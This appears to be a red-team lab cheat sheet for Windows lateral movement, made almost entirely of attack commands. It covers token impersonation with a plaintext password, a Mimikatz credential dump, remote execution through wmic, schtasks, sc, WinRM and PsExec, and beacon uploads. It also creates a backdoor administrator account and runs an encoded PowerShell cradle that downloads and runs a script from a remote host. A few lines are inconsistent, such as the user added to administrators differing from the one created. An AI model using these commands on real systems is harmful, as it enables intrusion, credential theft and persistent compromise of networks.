### Notes
```
make token cyberbotic.io\f.cohen Hunter2 SMB
spawnas cyberbotic.io\f.cohen Hunter2 SMB
steal_token 7750 
```
### Mimikatz
```
mimikatz sekurlsa::wdigest

```
###  lateral movement
```
#File Copy
cd c:\windows\temp
cd C:\Temp
shell copy foobar.exe \\host\C$\windows\temp
shell wmic /node:host process call create “c:\windows\temp\foobar.exe”

#Remote Code Execution
shell net time \\host
shell at \\host HH:MM c:\windows\temp\foobar.exe
shell copy Service.exe \\wkstn-4945\c$\Temp\foobar.exe


shell schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System
shell schtasks /run /tn foobar /S host
shell schtasks /F /delete /tn foobar /S host


shell sc \\host create foobar binpath= “c:\windows\temp\foobar.exe”
shell sc \\wkstn-4945 create foobar binpath= "c:\windows\temp\foobar.exe"
shell sc \\host start foobar
shell sc \\host delete foobar
link host
```
### Windows Management Instrumentation
```
upload C:\payloads\tcp-beacon.exe (\\wkstn-4945\c$\Windows\Temp\tcp-beacon.exe)
remote-exec wmi wkstn-4945 C:\Windows\Temp\tcp-beacon.exe
connect wkstn-4945 1337
```
```
shell wmic /node:WS02 /user:DOMAIN\insomnia.io /password:insomnia process call create "powershell.exe -Enc B7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA=="

```
### PowerShell Remoting
```
jump winrm64 192.168.100.100 tcp
remote-exec winrm 192.168.100.100 whoami; hostname

```
### PsExec
```
remote-exec psexec wkstn-4945 cmd.exe /c "net user rastamouse Passw0rd! /add && net localgroup administrators MeMe /add"
remote-exec winrm wkstn-4945 net localgroup administrators
```

### Remote File Upload
```
copy C:\Windows\Temp\Malice.exe \\target.domain\C$\Windows\Temp
wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\Temp\Malice.exe"
```
